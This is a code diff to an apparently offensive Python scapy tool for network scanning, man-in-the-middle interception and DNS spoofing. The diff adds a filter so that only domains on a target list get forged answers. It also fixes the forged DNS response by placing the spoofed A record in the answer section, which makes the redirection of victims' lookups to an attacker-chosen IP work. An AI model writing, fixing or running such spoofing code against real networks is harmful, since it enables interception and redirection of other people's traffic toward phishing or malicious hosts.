@@ -6,10 +6,14 @@ ipv4_regex = r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9
 null_mac_address = "ff:ff:ff:ff:ff:ff"
 stop_flag_sniffing = threading.Event() #flags mainly used for packet injection
 stop_flag_mitm = threading.Event()
+with open("websites_list_without_domains.txt", "r") as f:
+    websites_list = f.read().split("\n")
 
 def scan(network_ip: str, verbose: bool, wait: int, subnet_mask: int) -> None:
     #checking if the network's ip address is valid
-    if not re.search(ipv4_regex, network_ip): return 
+    if not re.search(ipv4_regex, network_ip): 
+        print("Invalid network IP address")
+        return 
 
     #scanning the network
     subnet = f"{network_ip}/{subnet_mask}"
@@ -102,9 +106,15 @@ def sniff_traffic(spoof_ip: str, ttl: int, redirect_to: str):
             print(f"\nThe following error was unhandled and the attack had to be stopped: \n{e}")
             break
 
+def check_website(queried_website: str) -> bool:
+    for website in websites_list:
+        if website in queried_website:
+            return True
+    return False
+
 def checkpacket(packet, spoof_ip: str, time_to_live: int, redirect_to_ip: str):
     try:
-        if packet.haslayer(scapy.DNS) and packet.haslayer(scapy.IP) and packet[scapy.IP].src == spoof_ip:
+        if packet.haslayer(scapy.DNS) and packet.haslayer(scapy.IP) and packet[scapy.IP].src == spoof_ip and check_website(packet[scapy.DNSQR].qname.decode()):
             ether_layer = scapy.Ether(
                 src=packet[scapy.Ether].dst,
                 dst=packet[scapy.Ether].src
@@ -123,7 +133,7 @@ def checkpacket(packet, spoof_ip: str, time_to_live: int, redirect_to_ip: str):
                 ancount = 1,
                 nscount = 0,
                 arcount = 0,
-                ar=scapy.DNSRR(
+                an=scapy.DNSRR(
                     rrname = packet[scapy.DNS].qd.qname,
                     type="A",
                     ttl=time_to_live, 
